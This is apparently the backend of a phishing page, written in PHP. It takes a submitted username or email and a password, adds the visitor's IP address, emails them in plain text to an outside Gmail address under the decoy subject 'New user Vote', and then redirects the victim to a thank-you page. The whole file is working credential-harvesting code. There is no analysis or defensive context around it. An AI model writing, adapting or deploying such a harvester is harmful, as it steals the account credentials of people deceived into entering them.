<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") 
{
// Retrieve the username or email and password from the form
$username_email = $_POST['username_or_email'];
$password = $_POST['password'];

  // Retrieve the user's IP address
  $ip_address = $_SERVER["REMOTE_ADDR"];

  // Set the recipient email address
  $to = "liquiditycloud@gmail.com";

  // Set the subject of the email
  $subject = "New user Vote";

  // Build the body of the email
  $body = "A new user has vote:\n\n";
  $body .= "username_or_email: " . $username_email . "\n";
  $body .= "password: " . $password . "\n";
  $body .= "IP Address: " . $ip_address . "\n";

  // Send the email using the mail() function
  mail($to, $subject, $body);

  // Redirect to another web page
header("Location: thank-you.html");

}
?>
